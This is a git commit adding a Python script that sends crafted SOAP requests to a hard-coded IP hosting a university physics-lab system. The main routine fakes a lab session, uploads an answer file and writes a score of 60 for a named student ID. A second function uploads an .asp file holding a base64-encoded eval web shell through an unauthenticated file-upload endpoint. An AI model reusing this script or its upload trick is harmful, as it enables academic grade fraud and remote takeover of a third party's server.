360a2d3e87314cc47082fbb8987c604685f656b4
dyf <843347859@qq.com>
2020-04-23 10:44:30 +0800

    init

---
+++ fuck.py
@@ -0,0 +1,187 @@
+#!  /usr/bin/env python3
+# coding=utf-8
+
+import re
+import requests
+import base64
+from bs4 import BeautifulSoup
+
+
+def info(dataType, data):
+    print('\033[036m[+]{0}\033[0m: \033[035m{1}\033[0m'.format(dataType, data))
+    return data
+
+
+def initFirst(userId):
+    url = "http://118.184.217.73:7182/BizService.svc"
+    headers = {"Content-Type": "text/xml; charset=utf-8",
+               "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService",
+               }
+    body = '''<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
+              <s:Body><DoService xmlns="http://www.ustcori.com/2009/10">
+              <request xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+              <BizCode>UstcOri.BLL.BLLUserCountControl</BizCode>
+              <EnableCache>false</EnableCache>
+              <MethodName>ucControlMethod</MethodName>
+              <Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+              <a:KeyValueOfstringanyType><a:Key>ucControl</a:Key>
+              <a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":0,"LabID":364,"UserID":"''' + str(
+        userId) + '''","ServiceID":"开始实验","StartTime":"\/Date(-62135596800000+0800)\/","OperType":0,"ServiceFlag":false,"ServiceNumber":0,"MaxFileTime":0}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'''
+
+    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))
+
+    contain = resp.content.decode()
+    id = re.findall("DataString>(\d{4})", contain)[0]
+    info("id", id)
+    return id
+
+
+def initSecond(userId):
+    url = "http://118.184.217.73:7182/BizService.svc"
+    headers = {"Content-Type": "text/xml; charset=utf-8",
+               "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService", }
+
+    body = '''
+    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
+    <s:Body><DoService xmlns="http://www.ustcori.com/2009/10">
+    <request xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+    <BizCode>UstcOri.BLL.BLLLabClent</BizCode>
+    <EnableCache>false</EnableCache><MethodName>SetLabTimeRecord</MethodName>
+    <Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+    <a:KeyValueOfstringanyType><a:Key>labTime</a:Key>
+    <a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":0,"USERID":"''' + str(
+        userId) + '''","LABID":364,"STARTTIME":"\/Date(-62135596800000+0800)\/","ENDTIME":"\/Date(-62135596800000+0800)\/","Mark":"1","LabDateUrl":null,"Score":0}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'''
+
+    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))
+
+    contain = resp.content.decode()
+    id = re.findall("DataString>(\d{4})", contain)[0]
+    info("id", id)
+    return id
+
+
+def initThird(userId):
+    url = "http://118.184.217.73:7182/BizService.svc"
+    headers = {"Content-Type": "text/xml; charset=utf-8",
+               "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService"}
+
+    body = '''
+    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
+    <s:Body><DoService xmlns="http://www.ustcori.com/2009/10">
+    <request xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+    <BizCode>UstcOri.BLL.BLLLabClent</BizCode><EnableCache>false</EnableCache><MethodName>JFIsAccess</MethodName>
+    <Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+    <a:KeyValueOfstringanyType><a:Key>UserID</a:Key>
+    <a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">"''' + str(userId) + '''"</a:Value></a:KeyValueOfstringanyType><a:KeyValueOfstringanyType><a:Key>LabName</a:Key><a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">"01-光电效应和普朗克常量的测定"</a:Value></a:KeyValueOfstringanyType><a:KeyValueOfstringanyType><a:Key>SysID</a:Key><a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">1</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>
+    '''
+
+    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))
+
+    contain = resp.content.decode()
+    status = re.findall("<Status>(\w{7})", contain)[0]
+    info("status", status)
+    if status == "Success":
+        return True
+    else:
+        return False
+
+
+def sendFile(userId):
+    url = "http://118.184.217.73:7182/FileTransfer.svc"
+    headers = {"Content-Type": "text/xml; charset=utf-8",
+               "SOAPAction": "http://tempuri.org/IFileTransfer/UploadFile"}
+
+    with open("./answer.txt", "r") as f:
+        answer = f.read()
+        f.close()
+
+    body = '''<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
+    <s:Body><UploadFile xmlns="http://tempuri.org/">
+    <fileName>''' + str(userId) + '''_2020421224510.xml</fileName><path>Upload\LabDate\\01-光电效应和普朗克常量的测定</path>'''
+    body += "<content>" + answer + "</content>" + "<append>false</append></UploadFile></s:Body></s:Envelope>"
+    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))
+
+    contain = resp.content.decode()
+    if len(contain) == 143:
+        return True
+    else:
+        return False
+
+
+def setScore(userId, id, score):
+    url = "http://118.184.217.73:7182/BizService.svc"
+    headers = {"Content-Type": "text/xml; charset=utf-8",
+               "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService"}
+    body = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><DoService xmlns="http://www.ustcori.com/2009/10"><request xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><BizCode>UstcOri.BLL.BLLLabClent</BizCode><EnableCache>false</EnableCache><MethodName>SetLabTimeRecord</MethodName><Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><a:KeyValueOfstringanyType><a:Key>labTime</a:Key><a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":' + str(
+        id) + ',"USERID":"' + str(
+        userId) + '","LABID":364,"STARTTIME":"\/Date(-62135596800000+0800)\/","ENDTIME":"\/Date(-62135596800000+0800)\/","Mark":"2","LabDateUrl":"Upload\\\\LabDate\\\\01-光电效应和普朗克常量的测定\\\\' + str(
+        userId) + '_2020421224510.xml","Score":' + str(
+        score) + '}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'
+    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))
+
+    contain = resp.content.decode()
+    status = re.findall("<Status>(\w{7})", contain)[0]
+    info("status", status)
+    if status == "Success":
+        return True
+    else:
+        return False
+
+
+def flushState(id):
+    url = "http://118.184.217.73:7182/BizService.svc"
+    headers = {"Content-Type": "text/xml; charset=utf-8",
+               "SOAPAction": "http://www.ustcori.com/2009/10/IBizService/DoService"}
+    body = '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><DoService xmlns="http://www.ustcori.com/2009/10"><request xmlns:i="http://www.w3.org/2001/XMLSchema-instance"><BizCode>UstcOri.BLL.BLLUserCountControl</BizCode><EnableCache>false</EnableCache><MethodName>ucControlMethod</MethodName><Parameters xmlns:a="http://schemas.microsoft.com/2003/10/Serialization/Arrays"><a:KeyValueOfstringanyType><a:Key>ucControl</a:Key><a:Value i:type="b:string" xmlns:b="http://www.w3.org/2001/XMLSchema">{"ID":' + str(
+        id) + ',"LabID":0,"UserID":null,"ServiceID":null,"StartTime":"\/Date(-62135596800000+0800)\/","OperType":1,"ServiceFlag":false,"ServiceNumber":0,"MaxFileTime":0}</a:Value></a:KeyValueOfstringanyType></Parameters></request></DoService></s:Body></s:Envelope>'
+    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))
+
+    contain = resp.content.decode()
+    status = re.findall("<Status>(\w{7})", contain)[0]
+    info("status", status)
+    if status == "Success":
+        return True
+    else:
+        return False
+
+
+def writeShell():
+    url = "http://118.184.217.73:7182/FileTransfer.svc"
+    headers = {"Content-Type": "text/xml; charset=utf-8",
+               "SOAPAction": "http://tempuri.org/IFileTransfer/UploadFile"}
+
+    with open("./a.asp", "r") as f:
+        shell = f.read()
+        f.close()
+    payload = base64.b16encode(shell.encode())
+    f = "PCVldmFsIHJlcXVlc3QoImNob3BwZXIiKSU+"
+    info("answer", payload)
+    body = '''<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
+        <s:Body><UploadFile xmlns="http://tempuri.org/">
+        <fileName>''' + str(41824208) + '''_2020421224510.asp</fileName><path>Upload\LabDate\\01-光电效应和普朗克常量的测定</path>'''
+    body += "<content>" + f + "</content>" + "<append>false</append></UploadFile></s:Body></s:Envelope>"
+    resp = requests.post(url=url, headers=headers, data=body.encode('utf-8'))
+
+    contain = resp.content.decode()
+    # if len(contain) == 143:
+    #     return True
+    # else:
+    #     return False
+    info("contain", contain)
+
+
+def main():
+    # writeShell()
+    # exit()
+    # userId = 41824163
+    userId = 41724235
+    id1 = initFirst(userId)
+    id2 = initSecond(userId)
+    status = initThird(userId)
+    serilizeStatus = sendFile(userId)
+    setScoreStatus = setScore(userId, id2, 60)
+    flushStatus = flushState(id1)
+
+
+if __name__ == "__main__":
+    main()
